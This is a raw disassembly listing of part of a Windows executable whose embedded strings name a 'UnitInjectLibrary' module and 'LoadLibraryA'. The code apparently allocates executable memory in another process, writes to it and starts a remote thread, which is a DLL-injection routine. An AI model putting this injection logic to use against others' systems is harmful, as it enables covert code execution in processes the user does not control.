  40346a:	64 89 20             	mov    %esp,%fs:(%eax)
  40346d:	ff 05 74 e6 40 00    	incl   0x40e674
  403473:	75 0a                	jne    0x40347f
  403475:	b8 70 d0 40 00       	mov    $0x40d070,%eax
  40347a:	e8 41 e6 ff ff       	call   0x401ac0
  40347f:	33 c0                	xor    %eax,%eax
  403481:	5a                   	pop    %edx
  403482:	59                   	pop    %ecx
  403483:	59                   	pop    %ecx
  403484:	64 89 10             	mov    %edx,%fs:(%eax)
  403487:	68 94 34 40 00       	push   $0x403494
  40348c:	c3                   	ret
  40348d:	e9 7a e3 ff ff       	jmp    0x40180c
  403492:	eb f8                	jmp    0x40348c
  403494:	5d                   	pop    %ebp
  403495:	c3                   	ret
  403496:	8b c0                	mov    %eax,%eax
  403498:	83 2d 74 e6 40 00 01 	subl   $0x1,0x40e674
  40349f:	c3                   	ret
  4034a0:	55                   	push   %ebp
  4034a1:	8b ec                	mov    %esp,%ebp
  4034a3:	33 c0                	xor    %eax,%eax
  4034a5:	55                   	push   %ebp
  4034a6:	68 c5 34 40 00       	push   $0x4034c5
  4034ab:	64 ff 30             	push   %fs:(%eax)
  4034ae:	64 89 20             	mov    %esp,%fs:(%eax)
  4034b1:	ff 05 7c e6 40 00    	incl   0x40e67c
  4034b7:	33 c0                	xor    %eax,%eax
  4034b9:	5a                   	pop    %edx
  4034ba:	59                   	pop    %ecx
  4034bb:	59                   	pop    %ecx
  4034bc:	64 89 10             	mov    %edx,%fs:(%eax)
  4034bf:	68 cc 34 40 00       	push   $0x4034cc
  4034c4:	c3                   	ret
  4034c5:	e9 42 e3 ff ff       	jmp    0x40180c
  4034ca:	eb f8                	jmp    0x4034c4
  4034cc:	5d                   	pop    %ebp
  4034cd:	c3                   	ret
  4034ce:	8b c0                	mov    %eax,%eax
  4034d0:	83 2d 7c e6 40 00 01 	subl   $0x1,0x40e67c
  4034d7:	c3                   	ret
  4034d8:	ff 25 e4 01 41 00    	jmp    *0x4101e4
  4034de:	8b c0                	mov    %eax,%eax
  4034e0:	ff 25 e0 01 41 00    	jmp    *0x4101e0
  4034e6:	8b c0                	mov    %eax,%eax
  4034e8:	ff 25 dc 01 41 00    	jmp    *0x4101dc
  4034ee:	8b c0                	mov    %eax,%eax
  4034f0:	ff 25 d8 01 41 00    	jmp    *0x4101d8
  4034f6:	8b c0                	mov    %eax,%eax
  4034f8:	ff 25 d4 01 41 00    	jmp    *0x4101d4
  4034fe:	8b c0                	mov    %eax,%eax
  403500:	ff 25 d0 01 41 00    	jmp    *0x4101d0
  403506:	8b c0                	mov    %eax,%eax
  403508:	ff 25 cc 01 41 00    	jmp    *0x4101cc
  40350e:	8b c0                	mov    %eax,%eax
  403510:	ff 25 c8 01 41 00    	jmp    *0x4101c8
  403516:	8b c0                	mov    %eax,%eax
  403518:	ff 25 c4 01 41 00    	jmp    *0x4101c4
  40351e:	8b c0                	mov    %eax,%eax
  403520:	ff 25 c0 01 41 00    	jmp    *0x4101c0
  403526:	8b c0                	mov    %eax,%eax
  403528:	ff 25 bc 01 41 00    	jmp    *0x4101bc
  40352e:	8b c0                	mov    %eax,%eax
  403530:	ff 25 b8 01 41 00    	jmp    *0x4101b8
  403536:	8b c0                	mov    %eax,%eax
  403538:	ff 25 a4 02 41 00    	jmp    *0x4102a4
  40353e:	8b c0                	mov    %eax,%eax
  403540:	ff 25 a0 02 41 00    	jmp    *0x4102a0
  403546:	8b c0                	mov    %eax,%eax
  403548:	ff 25 9c 02 41 00    	jmp    *0x41029c
  40354e:	8b c0                	mov    %eax,%eax
  403550:	ff 25 98 02 41 00    	jmp    *0x410298
  403556:	8b c0                	mov    %eax,%eax
  403558:	ff 25 98 02 41 00    	jmp    *0x410298
  40355e:	8b c0                	mov    %eax,%eax
  403560:	ff 25 94 02 41 00    	jmp    *0x410294
  403566:	8b c0                	mov    %eax,%eax
  403568:	55                   	push   %ebp
  403569:	8b ec                	mov    %esp,%ebp
  40356b:	8b 45 10             	mov    0x10(%ebp),%eax
  40356e:	50                   	push   %eax
  40356f:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  403573:	1b c0                	sbb    %eax,%eax
  403575:	40                   	inc    %eax
  403576:	83 e0 7f             	and    $0x7f,%eax
  403579:	50                   	push   %eax
  40357a:	8b 45 08             	mov    0x8(%ebp),%eax
  40357d:	50                   	push   %eax
  40357e:	e8 dd ff ff ff       	call   0x403560
  403583:	5d                   	pop    %ebp
  403584:	c2 0c 00             	ret    $0xc
  403587:	90                   	nop
  403588:	ff 25 90 02 41 00    	jmp    *0x410290
  40358e:	8b c0                	mov    %eax,%eax
  403590:	ff 25 8c 02 41 00    	jmp    *0x41028c
  403596:	8b c0                	mov    %eax,%eax
  403598:	ff 25 88 02 41 00    	jmp    *0x410288
  40359e:	8b c0                	mov    %eax,%eax
  4035a0:	ff 25 84 02 41 00    	jmp    *0x410284
  4035a6:	8b c0                	mov    %eax,%eax
  4035a8:	ff 25 80 02 41 00    	jmp    *0x410280
  4035ae:	8b c0                	mov    %eax,%eax
  4035b0:	ff 25 7c 02 41 00    	jmp    *0x41027c
  4035b6:	8b c0                	mov    %eax,%eax
  4035b8:	ff 25 78 02 41 00    	jmp    *0x410278
  4035be:	8b c0                	mov    %eax,%eax
  4035c0:	ff 25 74 02 41 00    	jmp    *0x410274
  4035c6:	8b c0                	mov    %eax,%eax
  4035c8:	ff 25 70 02 41 00    	jmp    *0x410270
  4035ce:	8b c0                	mov    %eax,%eax
  4035d0:	ff 25 6c 02 41 00    	jmp    *0x41026c
  4035d6:	8b c0                	mov    %eax,%eax
  4035d8:	ff 25 68 02 41 00    	jmp    *0x410268
  4035de:	8b c0                	mov    %eax,%eax
  4035e0:	ff 25 64 02 41 00    	jmp    *0x410264
  4035e6:	8b c0                	mov    %eax,%eax
  4035e8:	ff 25 60 02 41 00    	jmp    *0x410260
  4035ee:	8b c0                	mov    %eax,%eax
  4035f0:	ff 25 5c 02 41 00    	jmp    *0x41025c
  4035f6:	8b c0                	mov    %eax,%eax
  4035f8:	ff 25 58 02 41 00    	jmp    *0x410258
  4035fe:	8b c0                	mov    %eax,%eax
  403600:	ff 25 54 02 41 00    	jmp    *0x410254
  403606:	8b c0                	mov    %eax,%eax
  403608:	ff 25 50 02 41 00    	jmp    *0x410250
  40360e:	8b c0                	mov    %eax,%eax
  403610:	ff 25 4c 02 41 00    	jmp    *0x41024c
  403616:	8b c0                	mov    %eax,%eax
  403618:	ff 25 48 02 41 00    	jmp    *0x410248
  40361e:	8b c0                	mov    %eax,%eax
  403620:	ff 25 44 02 41 00    	jmp    *0x410244
  403626:	8b c0                	mov    %eax,%eax
  403628:	ff 25 40 02 41 00    	jmp    *0x410240
  40362e:	8b c0                	mov    %eax,%eax
  403630:	ff 25 3c 02 41 00    	jmp    *0x41023c
  403636:	8b c0                	mov    %eax,%eax
  403638:	ff 25 38 02 41 00    	jmp    *0x410238
  40363e:	8b c0                	mov    %eax,%eax
  403640:	ff 25 34 02 41 00    	jmp    *0x410234
  403646:	8b c0                	mov    %eax,%eax
  403648:	ff 25 30 02 41 00    	jmp    *0x410230
  40364e:	8b c0                	mov    %eax,%eax
  403650:	ff 25 2c 02 41 00    	jmp    *0x41022c
  403656:	8b c0                	mov    %eax,%eax
  403658:	ff 25 28 02 41 00    	jmp    *0x410228
  40365e:	8b c0                	mov    %eax,%eax
  403660:	ff 25 24 02 41 00    	jmp    *0x410224
  403666:	8b c0                	mov    %eax,%eax
  403668:	ff 25 20 02 41 00    	jmp    *0x410220
  40366e:	8b c0                	mov    %eax,%eax
  403670:	ff 25 1c 02 41 00    	jmp    *0x41021c
  403676:	8b c0                	mov    %eax,%eax
  403678:	ff 25 18 02 41 00    	jmp    *0x410218
  40367e:	8b c0                	mov    %eax,%eax
  403680:	ff 25 14 02 41 00    	jmp    *0x410214
  403686:	8b c0                	mov    %eax,%eax
  403688:	ff 25 10 02 41 00    	jmp    *0x410210
  40368e:	8b c0                	mov    %eax,%eax
  403690:	ff 25 0c 02 41 00    	jmp    *0x41020c
  403696:	8b c0                	mov    %eax,%eax
  403698:	ff 25 08 02 41 00    	jmp    *0x410208
  40369e:	8b c0                	mov    %eax,%eax
  4036a0:	ff 25 04 02 41 00    	jmp    *0x410204
  4036a6:	8b c0                	mov    %eax,%eax
  4036a8:	ff 25 00 02 41 00    	jmp    *0x410200
  4036ae:	8b c0                	mov    %eax,%eax
  4036b0:	ff 25 fc 01 41 00    	jmp    *0x4101fc
  4036b6:	8b c0                	mov    %eax,%eax
  4036b8:	ff 25 f8 01 41 00    	jmp    *0x4101f8
  4036be:	8b c0                	mov    %eax,%eax
  4036c0:	ff 25 f4 01 41 00    	jmp    *0x4101f4
  4036c6:	8b c0                	mov    %eax,%eax
  4036c8:	ff 25 f0 01 41 00    	jmp    *0x4101f0
  4036ce:	8b c0                	mov    %eax,%eax
  4036d0:	ff 25 ec 01 41 00    	jmp    *0x4101ec
  4036d6:	8b c0                	mov    %eax,%eax
  4036d8:	ff 25 d0 02 41 00    	jmp    *0x4102d0
  4036de:	8b c0                	mov    %eax,%eax
  4036e0:	ff 25 d4 02 41 00    	jmp    *0x4102d4
  4036e6:	8b c0                	mov    %eax,%eax
  4036e8:	ff 25 cc 02 41 00    	jmp    *0x4102cc
  4036ee:	8b c0                	mov    %eax,%eax
  4036f0:	ff 25 c8 02 41 00    	jmp    *0x4102c8
  4036f6:	8b c0                	mov    %eax,%eax
  4036f8:	ff 25 c4 02 41 00    	jmp    *0x4102c4
  4036fe:	8b c0                	mov    %eax,%eax
  403700:	ff 25 c0 02 41 00    	jmp    *0x4102c0
  403706:	8b c0                	mov    %eax,%eax
  403708:	ff 25 bc 02 41 00    	jmp    *0x4102bc
  40370e:	8b c0                	mov    %eax,%eax
  403710:	ff 25 b8 02 41 00    	jmp    *0x4102b8
  403716:	8b c0                	mov    %eax,%eax
  403718:	ff 25 b4 02 41 00    	jmp    *0x4102b4
  40371e:	8b c0                	mov    %eax,%eax
  403720:	ff 25 b0 02 41 00    	jmp    *0x4102b0
  403726:	8b c0                	mov    %eax,%eax
  403728:	ff 25 ac 02 41 00    	jmp    *0x4102ac
  40372e:	8b c0                	mov    %eax,%eax
  403730:	92                   	xchg   %eax,%edx
  403731:	e8 22 db ff ff       	call   0x401258
  403736:	c3                   	ret
  403737:	90                   	nop
  403738:	33 c9                	xor    %ecx,%ecx
  40373a:	e8 d5 dc ff ff       	call   0x401414
  40373f:	c3                   	ret
  403740:	a9 00 00 00 80       	test   $0x80000000,%eax
  403745:	0f 94 c0             	sete   %al
  403748:	f6 d8                	neg    %al
  40374a:	1b c0                	sbb    %eax,%eax
  40374c:	c3                   	ret
  40374d:	8d 40 00             	lea    0x0(%eax),%eax
  403750:	55                   	push   %ebp
  403751:	8b ec                	mov    %esp,%ebp
  403753:	33 c0                	xor    %eax,%eax
  403755:	55                   	push   %ebp
  403756:	68 75 37 40 00       	push   $0x403775
  40375b:	64 ff 30             	push   %fs:(%eax)
  40375e:	64 89 20             	mov    %esp,%fs:(%eax)
  403761:	ff 05 80 e6 40 00    	incl   0x40e680
  403767:	33 c0                	xor    %eax,%eax
  403769:	5a                   	pop    %edx
  40376a:	59                   	pop    %ecx
  40376b:	59                   	pop    %ecx
  40376c:	64 89 10             	mov    %edx,%fs:(%eax)
  40376f:	68 7c 37 40 00       	push   $0x40377c
  403774:	c3                   	ret
  403775:	e9 92 e0 ff ff       	jmp    0x40180c
  40377a:	eb f8                	jmp    0x403774
  40377c:	5d                   	pop    %ebp
  40377d:	c3                   	ret
  40377e:	8b c0                	mov    %eax,%eax
  403780:	83 2d 80 e6 40 00 01 	subl   $0x1,0x40e680
  403787:	c3                   	ret
  403788:	8c 37                	mov    %?,(%edi)
  40378a:	40                   	inc    %eax
  40378b:	00 11                	add    %dl,(%ecx)
  40378d:	0c 54                	or     $0x54,%al
  40378f:	53                   	push   %ebx
  403790:	74 72                	je     0x403804
  403792:	69 6e 67 41 72 72 61 	imul   $0x61727241,0x67(%esi),%ebp
  403799:	79 04                	jns    0x40379f
  40379b:	00 00                	add    %al,(%eax)
  40379d:	00 14 10             	add    %dl,(%eax,%edx,1)
  4037a0:	40                   	inc    %eax
  4037a1:	00 48 00             	add    %cl,0x0(%eax)
  4037a4:	00 00                	add    %al,(%eax)
  4037a6:	14 10                	adc    $0x10,%al
  4037a8:	40                   	inc    %eax
  4037a9:	00 11                	add    %dl,(%ecx)
  4037ab:	55                   	push   %ebp
  4037ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4037ad:	69 74 49 6e 6a 65 63 	imul   $0x7463656a,0x6e(%ecx,%ecx,2),%esi
  4037b4:	74 
  4037b5:	4c                   	dec    %esp
  4037b6:	69 62 72 61 72 79 c0 	imul   $0xc0797261,0x72(%edx),%esp
  4037bd:	37                   	aaa
  4037be:	40                   	inc    %eax
  4037bf:	00 0e                	add    %cl,(%esi)
  4037c1:	08 54 4c 69          	or     %dl,0x69(%esp,%ecx,2)
  4037c5:	62 49 6e             	bound  %ecx,0x6e(%ecx)
  4037c8:	66 6f                	outsw  %ds:(%esi),(%dx)
  4037ca:	14 00                	adc    $0x0,%al
  4037cc:	00 00                	add    %al,(%eax)
  4037ce:	01 00                	add    %eax,(%eax)
  4037d0:	00 00                	add    %al,(%eax)
  4037d2:	88 37                	mov    %dh,(%edi)
  4037d4:	40                   	inc    %eax
  4037d5:	00 10                	add    %dl,(%eax)
  4037d7:	00 00                	add    %al,(%eax)
  4037d9:	00 8b c0 33 d2 42    	add    %cl,0x42d233c0(%ebx)
  4037df:	8b c8                	mov    %eax,%ecx
  4037e1:	03 ca                	add    %edx,%ecx
  4037e3:	49                   	dec    %ecx
  4037e4:	80 39 c3             	cmpb   $0xc3,(%ecx)
  4037e7:	75 f5                	jne    0x4037de
  4037e9:	8b c2                	mov    %edx,%eax
  4037eb:	c3                   	ret
  4037ec:	55                   	push   %ebp
  4037ed:	8b ec                	mov    %esp,%ebp
  4037ef:	6a 00                	push   $0x0
  4037f1:	6a 00                	push   $0x0
  4037f3:	6a 00                	push   $0x0
  4037f5:	53                   	push   %ebx
  4037f6:	56                   	push   %esi
  4037f7:	57                   	push   %edi
  4037f8:	8b da                	mov    %edx,%ebx
  4037fa:	8b f0                	mov    %eax,%esi
  4037fc:	33 c0                	xor    %eax,%eax
  4037fe:	55                   	push   %ebp
  4037ff:	68 6a 38 40 00       	push   $0x40386a
  403804:	64 ff 30             	push   %fs:(%eax)
  403807:	64 89 20             	mov    %esp,%fs:(%eax)
  40380a:	6a 40                	push   $0x40
  40380c:	68 00 30 00 00       	push   $0x3000
  403811:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403814:	8b d3                	mov    %ebx,%edx
  403816:	e8 91 e4 ff ff       	call   0x401cac
  40381b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40381e:	e8 2d e5 ff ff       	call   0x401d50
  403823:	40                   	inc    %eax
  403824:	50                   	push   %eax
  403825:	6a 00                	push   $0x0
  403827:	56                   	push   %esi
  403828:	e8 5b fe ff ff       	call   0x403688
  40382d:	8b f8                	mov    %eax,%edi
  40382f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403832:	50                   	push   %eax
  403833:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403836:	8b d3                	mov    %ebx,%edx
  403838:	e8 6f e4 ff ff       	call   0x401cac
  40383d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403840:	e8 0b e5 ff ff       	call   0x401d50
  403845:	40                   	inc    %eax
  403846:	50                   	push   %eax
  403847:	53                   	push   %ebx
  403848:	57                   	push   %edi
  403849:	56                   	push   %esi
  40384a:	e8 71 fe ff ff       	call   0x4036c0
  40384f:	33 c0                	xor    %eax,%eax
  403851:	5a                   	pop    %edx
  403852:	59                   	pop    %ecx
  403853:	59                   	pop    %ecx
  403854:	64 89 10             	mov    %edx,%fs:(%eax)
  403857:	68 71 38 40 00       	push   $0x403871
  40385c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40385f:	ba 02 00 00 00       	mov    $0x2,%edx
  403864:	e8 7b e2 ff ff       	call   0x401ae4
  403869:	c3                   	ret
  40386a:	e9 9d df ff ff       	jmp    0x40180c
  40386f:	eb eb                	jmp    0x40385c
  403871:	8b c7                	mov    %edi,%eax
  403873:	5f                   	pop    %edi
  403874:	5e                   	pop    %esi
  403875:	5b                   	pop    %ebx
  403876:	8b e5                	mov    %ebp,%esp
  403878:	5d                   	pop    %ebp
  403879:	c3                   	ret
  40387a:	8b c0                	mov    %eax,%eax
  40387c:	53                   	push   %ebx
  40387d:	56                   	push   %esi
  40387e:	57                   	push   %edi
  40387f:	55                   	push   %ebp
  403880:	51                   	push   %ecx
  403881:	8b f1                	mov    %ecx,%esi
  403883:	8b ea                	mov    %edx,%ebp
  403885:	8b d8                	mov    %eax,%ebx
  403887:	6a 40                	push   $0x40
  403889:	68 00 30 00 00       	push   $0x3000
  40388e:	56                   	push   %esi
  40388f:	6a 00                	push   $0x0
  403891:	53                   	push   %ebx
  403892:	e8 f1 fd ff ff       	call   0x403688
  403897:	8b f8                	mov    %eax,%edi
  403899:	54                   	push   %esp
  40389a:	56                   	push   %esi
  40389b:	55                   	push   %ebp
  40389c:	57                   	push   %edi
  40389d:	53                   	push   %ebx
  40389e:	e8 1d fe ff ff       	call   0x4036c0
  4038a3:	8b c7                	mov    %edi,%eax
  4038a5:	5a                   	pop    %edx
  4038a6:	5d                   	pop    %ebp
  4038a7:	5f                   	pop    %edi
  4038a8:	5e                   	pop    %esi
  4038a9:	5b                   	pop    %ebx
  4038aa:	c3                   	ret
  4038ab:	90                   	nop
  4038ac:	55                   	push   %ebp
  4038ad:	8b ec                	mov    %esp,%ebp
  4038af:	83 c4 f4             	add    $0xfffffff4,%esp
  4038b2:	53                   	push   %ebx
  4038b3:	56                   	push   %esi
  4038b4:	57                   	push   %edi
  4038b5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4038b8:	8b fa                	mov    %edx,%edi
  4038ba:	8b d8                	mov    %eax,%ebx
  4038bc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4038bf:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4038c2:	8b c3                	mov    %ebx,%eax
  4038c4:	e8 b3 ff ff ff       	call   0x40387c
  4038c9:	8b f0                	mov    %eax,%esi
  4038cb:	8b c7                	mov    %edi,%eax
  4038cd:	e8 0a ff ff ff       	call   0x4037dc
  4038d2:	8b c8                	mov    %eax,%ecx
  4038d4:	8b d7                	mov    %edi,%edx
  4038d6:	8b c3                	mov    %ebx,%eax
  4038d8:	e8 9f ff ff ff       	call   0x40387c
  4038dd:	8d 55 f4             	lea    -0xc(%ebp),%edx
  4038e0:	52                   	push   %edx
  4038e1:	6a 00                	push   $0x0
  4038e3:	56                   	push   %esi
  4038e4:	50                   	push   %eax
  4038e5:	6a 00                	push   $0x0
  4038e7:	6a 00                	push   $0x0
  4038e9:	53                   	push   %ebx
  4038ea:	e8 a1 fc ff ff       	call   0x403590
  4038ef:	8b f8                	mov    %eax,%edi
  4038f1:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  4038f5:	74 1b                	je     0x403912
  4038f7:	6a ff                	push   $0xffffffff
  4038f9:	57                   	push   %edi
  4038fa:	e8 b1 fd ff ff       	call   0x4036b0
  4038ff:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403902:	50                   	push   %eax
  403903:	8b 45 0c             	mov    0xc(%ebp),%eax
  403906:	50                   	push   %eax
  403907:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40390a:	50                   	push   %eax
  40390b:	56                   	push   %esi
  40390c:	53                   	push   %ebx
  40390d:	e8 46 fd ff ff       	call   0x403658
  403912:	8b c7                	mov    %edi,%eax
  403914:	5f                   	pop    %edi
  403915:	5e                   	pop    %esi
  403916:	5b                   	pop    %ebx
  403917:	8b e5                	mov    %ebp,%esp
  403919:	5d                   	pop    %ebp
  40391a:	c2 08 00             	ret    $0x8
  40391d:	8d 40 00             	lea    0x0(%eax),%eax
  403920:	55                   	push   %ebp
  403921:	8b ec                	mov    %esp,%ebp
  403923:	83 c4 f4             	add    $0xfffffff4,%esp
  403926:	8b 45 08             	mov    0x8(%ebp),%eax
  403929:	8b 10                	mov    (%eax),%edx
  40392b:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40392e:	8b 50 04             	mov    0x4(%eax),%edx
  403931:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403934:	8b 50 08             	mov    0x8(%eax),%edx
  403937:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40393a:	ff 75 f8             	push   -0x8(%ebp)
  40393d:	ff 55 f4             	call   *-0xc(%ebp)
  403940:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403945:	50                   	push   %eax
  403946:	ff 55 fc             	call   *-0x4(%ebp)
  403949:	eb f5                	jmp    0x403940
  40394b:	8b e5                	mov    %ebp,%esp
  40394d:	5d                   	pop    %ebp
  40394e:	c2 04 00             	ret    $0x4
  403951:	8d 40 00             	lea    0x0(%eax),%eax
  403954:	55                   	push   %ebp
  403955:	8b ec                	mov    %esp,%ebp
  403957:	83 c4 f0             	add    $0xfffffff0,%esp
  40395a:	53                   	push   %ebx
  40395b:	56                   	push   %esi
  40395c:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40395f:	8b f0                	mov    %eax,%esi
  403961:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403964:	e8 cf e5 ff ff       	call   0x401f38
  403969:	33 c0                	xor    %eax,%eax
  40396b:	55                   	push   %ebp
  40396c:	68 f2 39 40 00       	push   $0x4039f2
  403971:	64 ff 30             	push   %fs:(%eax)
  403974:	64 89 20             	mov    %esp,%fs:(%eax)
  403977:	33 db                	xor    %ebx,%ebx
  403979:	68 04 3a 40 00       	push   $0x403a04
  40397e:	68 0c 3a 40 00       	push   $0x403a0c
  403983:	e8 70 fc ff ff       	call   0x4035f8
  403988:	50                   	push   %eax
  403989:	e8 82 fc ff ff       	call   0x403610
  40398e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403991:	68 18 3a 40 00       	push   $0x403a18
  403996:	68 0c 3a 40 00       	push   $0x403a0c
  40399b:	e8 58 fc ff ff       	call   0x4035f8
  4039a0:	50                   	push   %eax
  4039a1:	e8 6a fc ff ff       	call   0x403610
  4039a6:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4039a9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4039ac:	e8 97 e5 ff ff       	call   0x401f48
  4039b1:	8b d0                	mov    %eax,%edx
  4039b3:	8b c6                	mov    %esi,%eax
  4039b5:	e8 32 fe ff ff       	call   0x4037ec
  4039ba:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4039bd:	6a 0c                	push   $0xc
  4039bf:	6a 00                	push   $0x0
  4039c1:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4039c4:	ba 20 39 40 00       	mov    $0x403920,%edx
  4039c9:	8b c6                	mov    %esi,%eax
  4039cb:	e8 dc fe ff ff       	call   0x4038ac
  4039d0:	85 c0                	test   %eax,%eax
  4039d2:	74 08                	je     0x4039dc
  4039d4:	50                   	push   %eax
  4039d5:	e8 5e fb ff ff       	call   0x403538
  4039da:	b3 01                	mov    $0x1,%bl
  4039dc:	33 c0                	xor    %eax,%eax
  4039de:	5a                   	pop    %edx
  4039df:	59                   	pop    %ecx
  4039e0:	59                   	pop    %ecx
  4039e1:	64 89 10             	mov    %edx,%fs:(%eax)
  4039e4:	68 f9 39 40 00       	push   $0x4039f9
  4039e9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4039ec:	e8 cf e0 ff ff       	call   0x401ac0
  4039f1:	c3                   	ret
  4039f2:	e9 15 de ff ff       	jmp    0x40180c
  4039f7:	eb f0                	jmp    0x4039e9
  4039f9:	8b c3                	mov    %ebx,%eax
  4039fb:	5e                   	pop    %esi
  4039fc:	5b                   	pop    %ebx
  4039fd:	8b e5                	mov    %ebp,%esp
  4039ff:	5d                   	pop    %ebp
  403a00:	c3                   	ret
  403a01:	00 00                	add    %al,(%eax)
  403a03:	00 53 6c             	add    %dl,0x6c(%ebx)
  403a06:	65 65 70 00          	gs gs jo 0x403a0a
  403a0a:	00 00                	add    %al,(%eax)
  403a0c:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  403a10:	65 6c                	gs insb (%dx),%es:(%edi)
  403a12:	33 32                	xor    (%edx),%esi
  403a14:	00 00                	add    %al,(%eax)
  403a16:	00 00                	add    %al,(%eax)
  403a18:	4c                   	dec    %esp
  403a19:	6f                   	outsl  %ds:(%esi),(%dx)
  403a1a:	61                   	popa
  403a1b:	64 4c                	fs dec %esp
  403a1d:	69 62 72 61 72 79 41 	imul   $0x41797261,0x72(%edx),%esp
  403a24:	00 00                	add    %al,(%eax)
  403a26:	00 00                	add    %al,(%eax)
  403a28:	55                   	push   %ebp
  403a29:	8b ec                	mov    %esp,%ebp
  403a2b:	83 c4 ec             	add    $0xffffffec,%esp
  403a2e:	56                   	push   %esi
  403a2f:	57                   	push   %edi
  403a30:	8b 45 08             	mov    0x8(%ebp),%eax
  403a33:	8b f0                	mov    %eax,%esi
  403a35:	8d 7d ec             	lea    -0x14(%ebp),%edi
  403a38:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a39:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a3a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a3b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a3c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a3d:	ff 75 f8             	push   -0x8(%ebp)
  403a40:	ff 55 f4             	call   *-0xc(%ebp)
  403a43:	ff 75 fc             	push   -0x4(%ebp)
  403a46:	50                   	push   %eax
  403a47:	ff 55 f0             	call   *-0x10(%ebp)
  403a4a:	50                   	push   %eax
  403a4b:	ff 55 ec             	call   *-0x14(%ebp)
  403a4e:	5f                   	pop    %edi
  403a4f:	5e                   	pop    %esi
  403a50:	8b e5                	mov    %ebp,%esp
  403a52:	5d                   	pop    %ebp
  403a53:	c2 04 00             	ret    $0x4
  403a56:	8b c0                	mov    %eax,%eax
  403a58:	53                   	push   %ebx
  403a59:	56                   	push   %esi
  403a5a:	57                   	push   %edi
  403a5b:	55                   	push   %ebp
  403a5c:	83 c4 e8             	add    $0xffffffe8,%esp
  403a5f:	8b e9                	mov    %ecx,%ebp
  403a61:	8b fa                	mov    %edx,%edi
  403a63:	8b d8                	mov    %eax,%ebx
  403a65:	33 f6                	xor    %esi,%esi
  403a67:	68 04 3b 40 00       	push   $0x403b04
  403a6c:	68 18 3b 40 00       	push   $0x403b18
  403a71:	e8 82 fb ff ff       	call   0x4035f8
  403a76:	50                   	push   %eax
  403a77:	e8 94 fb ff ff       	call   0x403610
  403a7c:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403a80:	68 24 3b 40 00       	push   $0x403b24
  403a85:	68 18 3b 40 00       	push   $0x403b18
  403a8a:	e8 69 fb ff ff       	call   0x4035f8
  403a8f:	50                   	push   %eax
  403a90:	e8 7b fb ff ff       	call   0x403610
  403a95:	89 44 24 08          	mov    %eax,0x8(%esp)
  403a99:	68 34 3b 40 00       	push   $0x403b34
  403a9e:	68 18 3b 40 00       	push   $0x403b18
  403aa3:	e8 50 fb ff ff       	call   0x4035f8
  403aa8:	50                   	push   %eax
  403aa9:	e8 62 fb ff ff       	call   0x403610
  403aae:	89 44 24 04          	mov    %eax,0x4(%esp)
  403ab2:	8b d5                	mov    %ebp,%edx
  403ab4:	8b c3                	mov    %ebx,%eax
  403ab6:	e8 31 fd ff ff       	call   0x4037ec
  403abb:	89 44 24 14          	mov    %eax,0x14(%esp)
  403abf:	8b d7                	mov    %edi,%edx
  403ac1:	8b c3                	mov    %ebx,%eax
  403ac3:	e8 24 fd ff ff       	call   0x4037ec
  403ac8:	89 44 24 10          	mov    %eax,0x10(%esp)
  403acc:	6a 14                	push   $0x14
  403ace:	6a 00                	push   $0x0
  403ad0:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403ad4:	ba 28 3a 40 00       	mov    $0x403a28,%edx
  403ad9:	8b c3                	mov    %ebx,%eax
  403adb:	e8 cc fd ff ff       	call   0x4038ac
  403ae0:	8b d8                	mov    %eax,%ebx
  403ae2:	85 db                	test   %ebx,%ebx
  403ae4:	74 12                	je     0x403af8
  403ae6:	6a ff                	push   $0xffffffff
  403ae8:	53                   	push   %ebx
  403ae9:	e8 c2 fb ff ff       	call   0x4036b0
  403aee:	54                   	push   %esp
  403aef:	53                   	push   %ebx
  403af0:	e8 e3 fa ff ff       	call   0x4035d8
  403af5:	8b 34 24             	mov    (%esp),%esi
  403af8:	8b c6                	mov    %esi,%eax
  403afa:	83 c4 18             	add    $0x18,%esp
  403afd:	5d                   	pop    %ebp
  403afe:	5f                   	pop    %edi
  403aff:	5e                   	pop    %esi
  403b00:	5b                   	pop    %ebx
  403b01:	c3                   	ret
  403b02:	00 00                	add    %al,(%eax)
  403b04:	47                   	inc    %edi
  403b05:	65 74 4d             	gs je  0x403b55
  403b08:	6f                   	outsl  %ds:(%esi),(%dx)
  403b09:	64 75 6c             	fs jne 0x403b78
  403b0c:	65 48                	gs dec %eax
  403b0e:	61                   	popa
  403b0f:	6e                   	outsb  %ds:(%esi),(%dx)
  403b10:	64 6c                	fs insb (%dx),%es:(%edi)
  403b12:	65 41                	gs inc %ecx
  403b14:	00 00                	add    %al,(%eax)
  403b16:	00 00                	add    %al,(%eax)
  403b18:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  403b1c:	65 6c                	gs insb (%dx),%es:(%edi)
